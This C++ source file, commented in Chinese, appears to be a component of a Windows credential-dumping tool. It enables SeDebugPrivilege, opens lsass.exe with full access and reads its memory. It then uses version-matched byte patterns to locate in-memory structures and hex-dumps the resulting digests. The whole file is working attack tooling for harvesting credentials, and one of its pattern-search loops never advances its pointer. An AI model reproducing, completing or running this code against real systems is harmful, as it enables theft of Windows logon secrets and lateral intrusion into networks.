#include "stdafx.h"
#include <Windows.h>
#include "process.h"

#pragma comment(lib, "Version.lib")

#define SE_DEBUG_PRIVILEGE 0x14
BOOL EnableDebugPrivilege()
{
	/*
	HANDLE           hToken = NULL;
	LUID             sedebugnameValue = { 0 };
	TOKEN_PRIVILEGES tkp = { 0 };
	{
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Luid = sedebugnameValue;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	BOOL             bRet = FALSE;

	bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	RETN_IF(!bRet, L"OpenProcessToken", FALSE);

	bRet = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);
	RETN_IF(!bRet, L"LookupPrivilegeValue", FALSE);

	bRet = AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
	RETN_IF(!bRet, L"AdjustTokenPrivileges", FALSE);
	*/
	BOOLEAN  bEnabled = FALSE;
	NTSTATUS status;
	fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege) 
		GetProcAddress(GetModuleHandleW(L"ntdll"), "RtlAdjustPrivilege");
	RETN_IF(RtlAdjustPrivilege == NULL, L"GetProcAddress", FALSE);
	status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bEnabled);
	if (NT_SUCCESS(status))
		return TRUE;
	return FALSE;
}

DWORD GetProcessIdByName(IN LPCWSTR lpProcName)
{
	STARTUPINFOW        szStartupInfo       = { 0 };
	PROCESS_INFORMATION szProcessInfomation = { 0 };
	PROCESSENTRY32W     szProcessEntry      = { 0 };
	{
		szProcessEntry.dwSize = sizeof(PROCESSENTRY32W);
	}
	DWORD               dwProcessId         = -1;
	BOOL                bRet = FALSE;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	RETN_IF(hSnapshot == INVALID_HANDLE_VALUE, L"CreateToolhelp32Snapshot", -1);

	bRet = Process32FirstW(hSnapshot, &szProcessEntry);
	GOTO_IF(!bRet, L"Process32FirstW", cleanup);

	do
	{
		if (lstrcmpiW(szProcessEntry.szExeFile, lpProcName) == 0)
		{
			dwProcessId = szProcessEntry.th32ProcessID;
			break;
		}
	} while (Process32NextW(hSnapshot, &szProcessEntry));

cleanup:
	if(hSnapshot)
		CloseHandle(hSnapshot);

	return dwProcessId;
}

HANDLE OpenProcessByName(IN LPCWSTR lpProcName, OUT LPDWORD lpProcId)
{
	DWORD dwProcId = GetProcessIdByName(lpProcName);
	HANDLE hProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcId);
	RETN_IF(hProcHandle == NULL, L"OpenProcess", NULL);
	*lpProcId = dwProcId;
	return hProcHandle;
}
HANDLE hLsass = NULL;
BOOL OpenLsass()
{
	DWORD dwLsassProcId = 0;
	hLsass = OpenProcessByName(L"lsass.exe", &dwLsassProcId);
	RETN_IF(hLsass == NULL, L"OpenProcessByName", FALSE);
	MESSAGE(L"Open lsass.exe successfully, PID=%d\r\n", dwLsassProcId);
	return TRUE;
}

VOID CloseLsass()
{
	CloseHandle(hLsass);
}
BOOL ReadLsassMemory(IN LPVOID lpPtr, OUT LPVOID lpBuf, IN DWORD cbBuf)
{
	SIZE_T cbMemoryRead = 0;
	return ReadProcessMemory(hLsass, lpPtr, lpBuf, cbBuf, &cbMemoryRead);
}

ULONG64 GetModuleVersion(IN HMODULE hModule)
{
	TCHAR szFilePath[MAX_PATH] = { 0 };
	DWORD   dwHandle   = 0;
	DWORD   dwVerSize  = 0;
	ULONG64 ullVersion = -1;

	GetModuleFileNameW(hModule, szFilePath, MAX_PATH);
	dwVerSize = GetFileVersionInfoSizeW(szFilePath, &dwHandle);
	RETN_IF(dwVerSize <= 0, L"GetFileVersionInfoSizeW", -1);

	LPVOID lpBuff  = LocalAlloc(0, dwVerSize);
	LPVOID lpData  = NULL;
	UINT   uLength = 0;
	BOOL   bRet    = FALSE;

	bRet = GetFileVersionInfo(szFilePath, dwHandle, dwVerSize, lpBuff);
	GOTO_IF(!bRet, L"GetFileVersionInfo", cleanup);
	bRet = VerQueryValueW(lpBuff, L"\\", &lpData, &uLength);
	GOTO_IF(!bRet, L"VerQueryValue", cleanup);

	VS_FIXEDFILEINFO *lpFileInfo = (VS_FIXEDFILEINFO *)lpData;
	ullVersion = lpFileInfo->dwProductVersionMS;
	ullVersion = (ullVersion * 0x100000000) + lpFileInfo->dwProductVersionLS;
	//MESSAGE(L"%s: MS %.8x LS %.8x\r\n", szFilePath,lpFileInfo->dwProductVersionMS, lpFileInfo->dwProductVersionLS);
cleanup:
	LocalFree(lpBuff);
	return ullVersion;
}

//通过起始地址和结束地址查找8字节的pattern并返回地址，失败返回NULL
LPVOID FindPattern(IN LPVOID lpStart, IN LPVOID lpEnd, IN ULONG64 ulPattern)
{
	LPVOID lpRet = NULL;
	DWORD  dwSize = (DWORD)((LPBYTE) lpEnd - (LPBYTE)lpStart);

	RETN_IF(IsBadReadPtr(lpStart, dwSize), L"IsBadReadPtr", NULL);
	
	for (LPBYTE lpPtr = (LPBYTE)lpStart; lpPtr < (LPBYTE)lpEnd; lpPtr++)
	{
		if (*(PULONG64)lpPtr == ulPattern)
		{
			lpRet = lpPtr;
			break;
		}
	}
	return lpRet;
}

//通过起始地址和结束标记查找8字节的pattern并返回地址，失败返回NULL，不能对内存安全负责
LPVOID FindPattern(IN LPVOID lpStart, IN UCHAR ucTag, IN ULONG64 ulPattern)
{
	LPVOID lpRet = NULL;
	LPBYTE lpPtr = (LPBYTE)lpStart;
	RETN_IF(IsBadReadPtr(lpStart, 4), L"IsBadReadPtr", NULL);
	do
	{
		if (*(PULONG64)lpPtr == ulPattern)
		{
			lpRet = lpPtr;
			break;
		}
	} while (*lpPtr == ucTag);
	return lpRet;
}

//查找对应的偏移等信息
PIMAGE_PATTERN MatchPattern(IN HMODULE hModule, IN PIMAGE_PATTERN lpPattern)
{
	ULONG64 ulVersion = GetModuleVersion(hModule);
	MESSAGE(L"Module ulVersion: %llx\r\n", ulVersion);
	PIMAGE_PATTERN lpPatternMatch = NULL;
	for (; lpPattern->version; lpPattern++)
	{
		if (lpPattern->version == ulVersion)
		{
			lpPatternMatch = lpPattern;
			break;
		}
	}
	return lpPatternMatch;
}

//根据提供的hModule判断使用的pattern，进行内存搜索，返回[根据偏移量进行相对地址换算后]的地址，失败返回NULL
LPVOID FindPatternFromModule(IN HMODULE hModule, IN PIMAGE_PATTERN lpPattern,
	IN LPVOID lpStart, IN LPVOID lpEnd, IN BYTE ucTag)
{
	PIMAGE_PATTERN lpPatternMatch = MatchPattern(hModule, lpPattern);
	LPBYTE lpPtr = NULL;

	RETN_IF(lpPatternMatch == NULL, L"MatchPattern", NULL);
	if (ucTag == 0x00 && lpStart != NULL && lpEnd != NULL)
		lpPtr = (LPBYTE)FindPattern(lpStart, lpEnd, lpPatternMatch->sign);
	
	if (ucTag != 0x00 && lpStart != NULL)
		lpPtr = (LPBYTE)FindPattern(lpStart, ucTag, lpPatternMatch->sign);
	
	RETN_MSG_IF(lpPtr == NULL, NULL, L"Unsuported module version");
	
	lpPtr = lpPtr + *(LPDWORD)(lpPtr + lpPatternMatch->offset);

	return lpPtr;
}

VOID HexDump(IN LPBYTE lpPtr, IN DWORD dwSize, IN BOOL bNewline)
{
	for (DWORD dwOffset = 0; dwOffset < dwSize; dwOffset++)
	{
		printf("%.2x ", lpPtr[dwOffset]);
		if ((dwOffset + 1) % 8 == 0 && bNewline)
			puts("");
	}
	puts("");
}

VOID DigestDump(IN LPBYTE lpPtr, IN DWORD dwSize)
{
	for (DWORD dwOffset = 0; dwOffset < dwSize; dwOffset++)
	{
		printf("%.2x", lpPtr[dwOffset]);
	}
}
